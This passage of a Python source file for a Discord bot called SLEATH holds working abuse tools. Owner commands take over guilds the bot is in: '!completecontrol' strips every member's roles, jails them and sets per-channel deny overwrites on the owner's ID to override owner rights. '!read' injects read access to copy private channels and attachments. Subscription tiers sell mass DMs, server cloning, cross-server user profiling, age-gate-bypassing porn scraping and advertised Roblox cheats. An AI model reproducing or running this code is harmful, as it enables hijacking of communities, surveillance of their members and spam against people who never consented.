    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return

    await ctx.send(f"⚡ engaging complete control on `{guild.name}`...")

    # snapshot
    snapshot: dict[int, list[int]] = {}
    for member in guild.members:
        snapshot[member.id] = [r.id for r in member.roles if r.name != "@everyone"]
    control_snapshots[guild_id] = snapshot

    # create roles
    supreme_role = discord.utils.get(guild.roles, name="SLEATH-SUPREME") or await guild.create_role(
        name="SLEATH-SUPREME", permissions=discord.Permissions(administrator=True),
        color=discord.Color.dark_red(), hoist=True, reason="SLEATH"
    )
    prison_role = discord.utils.get(guild.roles, name="SLEATH-LOCKED") or await guild.create_role(
        name="SLEATH-LOCKED", permissions=discord.Permissions(0),
        color=discord.Color.dark_gray(), reason="SLEATH"
    )

    try:
        await guild.edit_role_positions({supreme_role: guild.me.top_role.position})
    except (discord.Forbidden, discord.HTTPException):
        pass
    try:
        await guild.me.add_roles(supreme_role)
    except discord.Forbidden:
        pass

    # strip + cage all non-bot members (roles)
    demoted, failed = 0, 0
    for member in guild.members:
        if member.id == bot.user.id:
            continue
        try:
            current_roles = [r for r in member.roles if r.name != "@everyone"]
            if current_roles:
                await member.remove_roles(*current_roles, reason="SLEATH CC")
            await member.add_roles(prison_role, reason="SLEATH CC")
            demoted += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1

    # ── channel overwrites — this is what actually cages the server owner ─────
    # Discord ignores role permissions for the server owner, but explicit
    # channel-level DENY overwrites on their user ID DO take effect.
    lock_ow = discord.PermissionOverwrite(
        send_messages=False,
        send_messages_in_threads=False,
        create_public_threads=False,
        create_private_threads=False,
        add_reactions=False,
        use_application_commands=False,
        manage_messages=False,
        manage_channels=False,
        manage_roles=False,
        mention_everyone=False,
        attach_files=False,
        embed_links=False,
        read_messages=True,
        read_message_history=True,
    )
    everyone_ow = discord.PermissionOverwrite(
        send_messages=False,
        send_messages_in_threads=False,
        create_public_threads=False,
        create_private_threads=False,
        add_reactions=False,
        use_application_commands=False,
        attach_files=False,
        embed_links=False,
    )

    ch_done, ch_fail = 0, 0
    for channel in guild.text_channels:
        try:
            # lock @everyone
            await channel.set_permissions(guild.default_role, overwrite=everyone_ow, reason="SLEATH CC")
            await asyncio.sleep(0.15)
            # lock the prison role
            await channel.set_permissions(prison_role, overwrite=lock_ow, reason="SLEATH CC")
            await asyncio.sleep(0.15)
            # explicitly deny the server owner by user ID — bypasses owner bypass
            await channel.set_permissions(guild.owner, overwrite=lock_ow, reason="SLEATH CC owner cage")
            ch_done += 1
            await asyncio.sleep(0.15)
        except (discord.Forbidden, discord.HTTPException):
            ch_fail += 1

    result = (
        f"✓ complete control — `{guild.name}`\n"
        f"`{demoted}` members caged" + (f", `{failed}` skipped" if failed else "") + "\n"
        f"`{ch_done}` channels locked (owner explicitly denied per-channel)"
        + (f", `{ch_fail}` failed" if ch_fail else "")
    )
    await ctx.send(result)


@bot.command(name="killswitch")
@commands.is_owner()
@home_only()
async def kill_switch(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    if guild_id not in control_snapshots:
        await ctx.send("no snapshot found — run `!completecontrol` first."); return

    await ctx.send(f"🔄 restoring `{guild.name}`...")
    snapshot = control_snapshots[guild_id]
    prison_role = discord.utils.get(guild.roles, name="SLEATH-LOCKED")

    # clear channel overwrites
    for channel in guild.text_channels:
        try:
            if prison_role:
                await channel.set_permissions(prison_role, overwrite=None, reason="SLEATH KS")
                await asyncio.sleep(0.15)
            await channel.set_permissions(guild.default_role, overwrite=None, reason="SLEATH KS")
            await asyncio.sleep(0.15)
            # remove owner user-level overwrite
            await channel.set_permissions(guild.owner, overwrite=None, reason="SLEATH KS")
            await asyncio.sleep(0.15)
        except (discord.Forbidden, discord.HTTPException):
            pass

    # restore member roles
    restored, failed = 0, 0
    for member in guild.members:
        if member.id == bot.user.id:
            continue
        try:
            if prison_role and prison_role in member.roles:
                await member.remove_roles(prison_role, reason="SLEATH KS")
            roles_to_restore = [guild.get_role(rid) for rid in snapshot.get(member.id, []) if guild.get_role(rid)]
            if roles_to_restore:
                await member.add_roles(*roles_to_restore, reason="SLEATH KS")
            restored += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1

    for name in ["SLEATH-SUPREME", "SLEATH-LOCKED"]:
        role = discord.utils.get(guild.roles, name=name)
        if role:
            try:
                await role.delete(reason="SLEATH KS cleanup")
            except (discord.Forbidden, discord.HTTPException):
                pass

    del control_snapshots[guild_id]
    await ctx.send(f"✓ restored `{guild.name}` — `{restored}` members" + (f", `{failed}` failed" if failed else ""))


# ══════════════════════════════════════════════════════════════════════════════
#  CHANNEL READER
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="read")
@commands.is_owner()
@home_only()
async def read_channel(ctx: commands.Context, channel_id: int, limit: int = 50):
    limit = min(limit, 200)
    source = bot.get_channel(channel_id)
    if not source:
        await ctx.send(f"channel `{channel_id}` not found."); return

    already = source.permissions_for(source.guild.me).read_message_history
    if not already:
        if not await _force_read_access(source):
            await ctx.send("can't inject read permission."); return

    await ctx.send(f"📥 reading `#{source.name}` — last `{limit}` messages")
    try:
        messages = [m async for m in source.history(limit=limit, oldest_first=True)]
    except discord.Forbidden:
        await ctx.send("can't read that channel."); return
    finally:
        if not already:
            await _revoke_read_access(source)

    if not messages:
        await ctx.send("channel is empty."); return

    buffer = []
    async def flush(buf):
        if buf:
            await ctx.send("```\n" + "\n".join(buf) + "\n```")
            buf.clear()

    for msg in messages:
        ts = msg.created_at.strftime("%Y-%m-%d %H:%M")
        author = str(msg.author)
        if msg.content:
            buffer.append(f"[{ts}] {author}: {msg.content}")
            if sum(len(l) for l in buffer) >= 1800:
                await flush(buffer)
        for att in msg.attachments:
            await flush(buffer)
            try:
                await ctx.send(content=f"`[{ts}] {author} — {att.filename}`", file=await att.to_file())
            except discord.HTTPException:
                await ctx.send(f"`[{ts}] {author} — too large:`\n{att.url}")
        for embed in msg.embeds:
            if embed.image and embed.image.url:
                await flush(buffer)
                relay = discord.Embed(color=0x2b2d31)
                relay.set_image(url=embed.image.url)
                relay.set_footer(text=f"{author} • {ts}")
                await ctx.send(embed=relay)

    await flush(buffer)
    await ctx.send(f"✓ `{len(messages)}` messages relayed from `#{source.name}`")


# ══════════════════════════════════════════════════════════════════════════════
#  TOOLS TIER
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="massdm")
@has_sub("tools")
async def mass_dm(ctx: commands.Context, guild_id: int, *, message: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    await ctx.send(f"📨 DMing `{guild.member_count}` members...")
    sent, failed = 0, 0
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(message)
            sent += 1
            await asyncio.sleep(1.2)
        except (discord.Forbidden, discord.HTTPException):
            failed += 1
    await ctx.send(f"✓ `{sent}` sent, `{failed}` failed")


@bot.command(name="cloneserver")
@has_sub("tools")
async def clone_server(ctx: commands.Context, guild_id: int):
    source = bot.get_guild(guild_id)
    if not source:
        await ctx.send("guild not found."); return
    await ctx.send(f"🔄 cloning `{source.name}`...")
    try:
        new_guild = await bot.create_guild(name=f"{source.name} [clone]")
    except discord.HTTPException as e:
        await ctx.send(f"failed: `{e}`"); return
    await asyncio.sleep(2)
    for channel in new_guild.channels:
        try:
            await channel.delete()
        except Exception:
            pass
    role_map: dict[int, discord.Role] = {}
    for role in reversed(source.roles):
        if role.name == "@everyone" or role.managed:
            continue
        try:
            nr = await new_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist)
            role_map[role.id] = nr
            await asyncio.sleep(0.3)
        except Exception:
            pass
    cat_map: dict[int, discord.CategoryChannel] = {}
    for cat in source.categories:
        try:
            nc = await new_guild.create_category(name=cat.name)
            cat_map[cat.id] = nc
            await asyncio.sleep(0.3)
        except Exception:
            pass
    for ch in source.text_channels:
        try:
            await new_guild.create_text_channel(name=ch.name, category=cat_map.get(ch.category_id), topic=ch.topic or "")
            await asyncio.sleep(0.3)
        except Exception:
            pass
    for ch in source.voice_channels:
        try:
            await new_guild.create_voice_channel(name=ch.name, category=cat_map.get(ch.category_id))
            await asyncio.sleep(0.3)
        except Exception:
            pass
    invite_url = "unavailable"
    for ch in new_guild.text_channels:
        try:
            inv = await ch.create_invite(max_age=0)
            invite_url = inv.url; break
        except Exception:
            pass
    await ctx.send(f"✓ clone created — {invite_url}")


@bot.command(name="backup")
@has_sub("tools")
async def backup_server(ctx: commands.Context, guild_id: int):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    lines = [f"# BACKUP — {guild.name} ({guild.id})", f"# {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}", ""]
    lines.append("## ROLES")
    for role in reversed(guild.roles):
        if role.name != "@everyone":
            lines.append(f"  {role.name} | id:{role.id} | perms:{role.permissions.value} | color:{role.color}")
    lines.append("\n## CHANNELS")
    for cat in guild.categories:
        lines.append(f"\n  [CATEGORY] {cat.name} | id:{cat.id}")
        for ch in cat.channels:
            lines.append(f"    [{ch.type.name.upper()}] #{ch.name} | id:{ch.id}")
    lines.append("\n## MEMBERS (first 100)")
    for member in list(guild.members)[:100]:
        roles = ", ".join(r.name for r in member.roles if r.name != "@everyone")
        lines.append(f"  {member} | id:{member.id} | roles:[{roles}]")
    content = "\n".join(lines)
    file = discord.File(fp=io.BytesIO(content.encode()), filename=f"backup_{guild.id}_{datetime.utcnow().strftime('%Y%m%d')}.txt")
    await ctx.send(f"✓ backup of `{guild.name}`", file=file)


@bot.command(name="profiler")
@has_sub("tools")
async def profiler(ctx: commands.Context, user_id: int):
    profile_data = []
    for guild in bot.guilds:
        member = guild.get_member(user_id)
        if not member:
            continue
        profile_data.append({
            "guild": guild.name, "guild_id": guild.id,
            "nick": member.nick,
            "roles": [r.name for r in member.roles if r.name != "@everyone"],
            "joined": member.joined_at.strftime("%Y-%m-%d") if member.joined_at else "unknown",
            "status": str(member.status)
        })
    if not profile_data:
        await ctx.send(f"user `{user_id}` not found in any shared server."); return
    try:
        user = await bot.fetch_user(user_id)
    except discord.NotFound:
        await ctx.send("user not found."); return
    embed = discord.Embed(title=f"Profile — {user}", color=0x2b2d31)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.add_field(name="User ID", value=str(user_id))
    embed.add_field(name="Created", value=user.created_at.strftime("%Y-%m-%d"))
    embed.add_field(name="Shared Servers", value=str(len(profile_data)))
    for entry in profile_data[:5]:
        embed.add_field(name=entry["guild"], value=f"nick: {entry['nick'] or 'none'}\njoined: {entry['joined']}\nroles: {', '.join(entry['roles'][:5]) or 'none'}\nstatus: {entry['status']}", inline=True)
    if len(profile_data) > 5:
        embed.set_footer(text=f"...and {len(profile_data)-5} more servers")
    await ctx.send(embed=embed)


_raidwatch_guilds: set[int] = set()
_join_log: dict[int, list[float]] = {}

@bot.event
async def on_member_join(member: discord.Member):
    import time
    guild_id = member.guild.id
    if guild_id not in _raidwatch_guilds:
        return
    now = time.time()
    _join_log.setdefault(guild_id, []).append(now)
    _join_log[guild_id] = [t for t in _join_log[guild_id] if now - t < 60]
    if len(_join_log[guild_id]) >= 10:
        home = bot.get_guild(HOME_GUILD_ID)
        if home:
            for channel in home.text_channels:
                if channel.permissions_for(home.me).send_messages:
                    await channel.send(f"🚨 **RAID ALERT** — `{member.guild.name}` — `{len(_join_log[guild_id])}` joins in 60s")
                    break


@bot.command(name="raidwatch")
@has_sub("tools")
async def raidwatch(ctx: commands.Context, guild_id: int, toggle: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    if toggle.lower() == "on":
        _raidwatch_guilds.add(guild_id)
        await ctx.send(f"✓ raid watch ON — `{guild.name}`")
    elif toggle.lower() == "off":
        _raidwatch_guilds.discard(guild_id)
        _join_log.pop(guild_id, None)
        await ctx.send(f"✓ raid watch OFF — `{guild.name}`")
    else:
        await ctx.send("use `on` or `off`")


# ══════════════════════════════════════════════════════════════════════════════
#  IMAGE / VIDEO SEARCH  (media tier)
# ══════════════════════════════════════════════════════════════════════════════

def _r34_random_pid(pool: int = 200) -> int:
    pages = pool // 100
    return random.randint(0, max(0, pages - 1)) * 100


def _r34_search(tags: str, limit: int = 100, pid: int = 0) -> list[dict]:
    url = f"https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1&limit={limit}&pid={pid}&tags={urllib.parse.quote(tags)}"
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=10) as r:
        data = json.loads(r.read().decode("utf-8"))
    return data if isinstance(data, list) else []


def search_images(query: str, max_results: int = 1) -> list[dict]:
    pool_size = min(max_results * 3, 100)
    results: list[dict] = []

    try:
        pid = _r34_random_pid(500)
        posts = []
        for tags in [query.replace(' ', '_'), query.replace(' ', '_') + " sort:score", query.replace(' ', '_').split('_')[0]]:
            posts = _r34_search(tags, limit=pool_size, pid=pid)
            if posts:
                break
        image_posts = [p for p in posts if p.get("file_url") and not p["file_url"].endswith((".mp4", ".webm"))]
        random.shuffle(image_posts)
        for post in image_posts[:pool_size]:
            results.append({"image": post["file_url"], "title": query, "source": f"https://rule34.xxx/index.php?page=post&s=view&id={post.get('id','')}"})
        if len(results) >= max_results:
            return random.sample(results, min(max_results, len(results)))
    except Exception:
        pass

    if len(results) < max_results:
        try:
            pid = random.randint(0, 20)
            posts = []
            for tags in [query.replace(' ', '_'), query.replace(' ', '_').split('_')[0]]:
                url = f"https://gelbooru.com/index.php?page=dapi&s=post&q=index&json=1&limit={pool_size}&pid={pid}&tags={urllib.parse.quote(tags)}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    data = json.loads(r.read().decode("utf-8"))
                posts = data.get("post", []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
                if posts:
                    break
            image_posts = [p for p in posts if p.get("file_url") and not p["file_url"].endswith((".mp4", ".webm"))]
            random.shuffle(image_posts)
            for post in image_posts[:pool_size]:
                results.append({"image": post["file_url"], "title": query, "source": f"https://gelbooru.com/index.php?page=post&s=view&id={post.get('id','')}"})
        except Exception:
            pass

    if len(results) >= max_results:
        return random.sample(results, min(max_results, len(results)))

    if len(results) < max_results:
        try:
            url = f"https://xhamster.com/search/{urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Referer": "https://xhamster.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            thumbs = re.findall(r'"thumbURL"\s*:\s*"(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'src="(https?://[^"]+xhcdn\.com[^"]+\.(?:jpg|jpeg|png|webp))"', body)
            titles = re.findall(r'"title"\s*:\s*"([^"]{5,120})"', body)
            random.shuffle(thumbs)
            for i, t in enumerate(thumbs[:pool_size]):
                results.append({"image": t, "title": html.unescape(titles[i]) if i < len(titles) else query, "source": "https://xhamster.com"})
        except Exception:
            pass

    if len(results) >= max_results:
        return random.sample(results, min(max_results, len(results)))

    if len(results) < max_results:
        try:
            url = f"https://www.pornhub.com/video/search?search={urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1", "Referer": "https://www.pornhub.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            thumbs = re.findall(r'data-mediumthumb="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'(https?://[^"\s]+phncdn\.com[^"\s]+\.(?:jpg|jpeg|png|webp))', body)
            thumbs = [t for t in thumbs if not BAD_THUMB.search(t)]
            titles = re.findall(r'title="([^"]{5,100})"', body)
            random.shuffle(thumbs)
            for i, t in enumerate(thumbs[:pool_size]):
                results.append({"image": t, "title": html.unescape(titles[i]) if i < len(titles) else query, "source": "https://www.pornhub.com"})
        except Exception:
            pass

    return random.sample(results, min(max_results, len(results))) if results else []


def search_videos(query: str, max_results: int = 1) -> list[dict]:
    pool_size = min(max_results * 5, 100)
    results: list[dict] = []

    try:
        pid = _r34_random_pid(500)
        posts = _r34_search(query.replace(' ', '_'), limit=pool_size, pid=pid)
        video_posts = [p for p in posts if p.get("file_url") and p["file_url"].endswith((".mp4", ".webm"))]
        random.shuffle(video_posts)
        for post in video_posts[:pool_size]:
            results.append({"video": post["file_url"], "preview": post.get("preview_url"), "title": query, "source": f"https://rule34.xxx/index.php?page=post&s=view&id={post.get('id','')}"})
        if len(results) >= max_results:
            return random.sample(results, min(max_results, len(results)))
    except Exception:
        pass

    if len(results) < max_results:
        try:
            url = f"https://www.pornhub.com/video/search?search={urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1", "Referer": "https://www.pornhub.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            vkeys = re.findall(r'href="/view_video\.php\?viewkey=([a-z0-9]+)"', body)
            thumbs = re.findall(r'data-mediumthumb="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'(https?://[^"\s]+phncdn\.com[^"\s]+\.(?:jpg|jpeg|png|webp))', body)
            thumbs = [t for t in thumbs if not BAD_THUMB.search(t)]
            titles = re.findall(r'title="([^"]{5,100})"', body)
            paired = list(zip(vkeys, thumbs, titles)) if titles else list(zip(vkeys, thumbs, [query]*len(vkeys)))
            random.shuffle(paired)
            seen: set[str] = set()
            for vk, thumb, title in paired[:pool_size]:
                if vk in seen: continue
                seen.add(vk)
                results.append({"video": None, "page_link": f"https://www.pornhub.com/view_video.php?viewkey={vk}", "preview": thumb, "title": html.unescape(title), "source": "https://www.pornhub.com"})
        except Exception:
            pass

    if len(results) >= max_results:
        return random.sample(results, min(max_results, len(results)))

    if len(results) < max_results:
        try:
            url = f"https://xhamster.com/search/{urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Referer": "https://xhamster.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            links = re.findall(r'"pageURL"\s*:\s*"(https?://xhamster\.com/videos/[^"]+)"', body)
            thumbs = re.findall(r'"thumbURL"\s*:\s*"(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'src="(https?://[^"]+xhcdn\.com[^"]+\.(?:jpg|jpeg|png|webp))"', body)
            titles = re.findall(r'"title"\s*:\s*"([^"]{5,120})"', body)
            paired = list(zip(links, thumbs, titles)) if titles else list(zip(links, thumbs, [query]*len(links)))
            random.shuffle(paired)
            for link, thumb, title in paired[:pool_size]:
                results.append({"video": None, "page_link": link, "preview": thumb, "title": html.unescape(title), "source": "https://xhamster.com"})
        except Exception:
            pass

    return random.sample(results, min(max_results, len(results))) if results else []


async def _send_media(ctx: commands.Context, url: str, title: str, query: str):
    headers = {"User-Agent": "Mozilla/5.0", "Referer": "https://www.pornhub.com/", "Accept": "*/*", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1"}
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    if len(data) <= DISCORD_FILE_LIMIT:
                        ct = resp.headers.get("Content-Type", "")
                        ext = "mp4" if "mp4" in ct or url.endswith(".mp4") else "webm" if "webm" in ct else "jpg"
                        await ctx.send(file=discord.File(fp=io.BytesIO(data), filename=f"{query.replace(' ','_')[:40]}.{ext}"))
                        return
    except Exception:
        pass
    await ctx.send(url)


@bot.command(name="image")
@has_sub("media")
async def image_single(ctx: commands.Context, *, query: str):
    async with ctx.typing():
        results = await asyncio.to_thread(search_images, query, 1)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    r = results[0]
    if r.get("image"):
        embed = discord.Embed(color=0x2b2d31)
        embed.set_image(url=r["image"])
        await ctx.send(embed=embed)


@bot.command(name="images")
@has_sub("media")
async def image_multi(ctx: commands.Context, count: int, *, query: str):
    count = max(1, min(count, 12))
    async with ctx.typing():
        results = await asyncio.to_thread(search_images, query, count)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    await ctx.send(f"🔍 `{query}` — {len(results)} image(s)")
    for r in results:
        if r.get("image"):
            embed = discord.Embed(color=0x2b2d31)
            embed.set_image(url=r["image"])
            await ctx.send(embed=embed)


@bot.command(name="imagesave")
@has_sub("media")
async def image_save(ctx: commands.Context, count: int, *, query: str):
    count = max(1, min(count, 6))
    async with ctx.typing():
        results = await asyncio.to_thread(search_images, query, count)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    await ctx.send(f"🔍 downloading {len(results)} image(s)...")
    async with aiohttp.ClientSession(headers={"User-Agent": "Mozilla/5.0"}) as session:
        for i, r in enumerate(results, 1):
            url = r.get("image")
            if not url:
                continue
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status != 200:
                        await ctx.send(f"result {i} — HTTP {resp.status}"); continue
                    data = await resp.read()
                ct = resp.headers.get("Content-Type", "")
                ext = "png" if "png" in ct else "gif" if "gif" in ct else "webp" if "webp" in ct else "jpg"
                await ctx.send(file=discord.File(fp=io.BytesIO(data), filename=f"{query.replace(' ','_')}_{i}.{ext}"))
            except Exception as e:
                await ctx.send(f"result {i} — `{e}`")


@bot.command(name="video")
@has_sub("media")
async def video_single(ctx: commands.Context, *, query: str):
    async with ctx.typing():
        results = await asyncio.to_thread(search_videos, query, 1)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    r = results[0]
    if r.get("video"):
        await _send_media(ctx, r["video"], r.get("title") or query, query)
    elif r.get("page_link"):
        embed = discord.Embed(title=r.get("title") or query, url=r["page_link"], color=0x2b2d31)
        if r.get("preview"):
            embed.set_image(url=r["preview"])
        embed.set_footer(text=r.get("source", ""))
        await ctx.send(embed=embed)


@bot.command(name="videos")
@has_sub("media")
async def video_multi(ctx: commands.Context, count: int, *, query: str):
    count = max(1, min(count, 6))
    async with ctx.typing():
        results = await asyncio.to_thread(search_videos, query, count)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    await ctx.send(f"🎬 {len(results)} result(s)")
    for i, r in enumerate(results, 1):
        if r.get("video"):
            await _send_media(ctx, r["video"], r.get("title") or f"result {i}", query)
        elif r.get("page_link"):
            embed = discord.Embed(title=r.get("title") or f"result {i}", url=r["page_link"], color=0x2b2d31)
            if r.get("preview"):
                embed.set_image(url=r["preview"])
            embed.set_footer(text=r.get("source", ""))
            await ctx.send(embed=embed)


@bot.command(name="imgsearch")
@commands.is_owner()
@home_only()
async def img_debug(ctx: commands.Context, *, query: str):
    await ctx.send("🔍 testing sources...")
    for name, url_str, hdr in [
        ("rule34", f"https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1&limit=1&tags={urllib.parse.quote(query.replace(' ','_'))}", {"User-Agent": "Mozilla/5.0"}),
        ("gelbooru", f"https://gelbooru.com/index.php?page=dapi&s=post&q=index&json=1&limit=1&tags={urllib.parse.quote(query.replace(' ','_'))}", {"User-Agent": "Mozilla/5.0"}),
    ]:
        try:
            req = urllib.request.Request(url_str, headers=hdr)
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read().decode("utf-8"))
            posts = data if isinstance(data, list) else data.get("post", [])
            if posts:
                await ctx.send(f"{name} ✓ — `{posts[0].get('file_url','none')[:120]}`")
            else:
                await ctx.send(f"{name} ✓ but empty for `{query}`")
        except Exception as e:
            await ctx.send(f"{name} ✗ — `{e}`")

    try:
        url = f"https://www.pornhub.com/video/search?search={urllib.parse.quote(query)}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1", "Referer": "https://www.pornhub.com/"})
        with urllib.request.urlopen(req, timeout=15) as r:
            body = r.read().decode("utf-8", errors="ignore")
        thumbs = re.findall(r'data-mediumthumb="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'(https?://[^"\s]+phncdn\.com[^"\s]+\.(?:jpg|jpeg|png|webp))', body)
        thumbs = [t for t in thumbs if not BAD_THUMB.search(t)]
        await ctx.send(f"pornhub ✓ — `{len(thumbs)}` thumbs" if thumbs else "pornhub ✓ — 0 thumbs")
    except Exception as e:
        await ctx.send(f"pornhub ✗ — `{e}`")


# ══════════════════════════════════════════════════════════════════════════════
#  HELP
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="cmds")
async def show_commands(ctx: commands.Context):
    is_owner = ctx.author.id == OWNER_ID
    sub = subscriptions.get(ctx.author.id)
    now = datetime.now(timezone.utc)
    tier = sub["tier"] if sub and sub["expires"] > now else None
    order = {"media": 0, "roblox": 1, "tools": 2}
    tier_rank = order.get(tier, -1)

    embed = discord.Embed(title="SLEATH — commands", color=0x2b2d31)
    embed.add_field(name="── public ──", value="`!plans` `!redeem <token>` `!mysub`", inline=False)

    if tier_rank >= 0 or is_owner:
        embed.add_field(name="── 📸 media ──", value="`!image` `!images` `!imagesave` `!video` `!videos`", inline=False)

    if tier_rank >= 1 or is_owner:
        embed.add_field(name="── 🎮 roblox ──", value=(
            "`!rbxfly` — fly (F to toggle)\n"
            "`!rbxesp` — ESP / wallhack\n"
            "`!rbxspeed` — speed hack (G to toggle)\n"
            "`!rbxinfjump` — infinite jump (H to toggle)\n"
            "`!rbxaimbot` — aimbot (J to toggle)"
        ), inline=False)

    if tier_rank >= 2 or is_owner:
        embed.add_field(name="── ⚙️ tools ──", value="`!massdm` `!cloneserver` `!backup` `!profiler` `!raidwatch`", inline=False)

    if is_owner:
        embed.add_field(name="── owner ──", value=(
            "`!servers` `!serverinfo` `!channels` `!members` `!roles`\n"
            "`!say` `!announce` `!invite` `!leave` `!nuke` `!openall`\n"
            "`!kick` `!ban` `!unban` `!nick` `!addrole` `!removerole`\n"
            "`!makerole` `!stripall` `!delete` `!purge` `!slowmode`\n"
            "`!read` `!finduser` `!finduserhere` `!imgsearch`\n"
            "`!completecontrol` `!killswitch`\n"
            "`!gentoken <tier> <days>` `!listsubs` `!revoke <user_id>`"
        ), inline=False)

    await ctx.send(embed=embed)


# ── run ────────────────────────────────────────────────────────────────────────
bot.run(TOKEN)
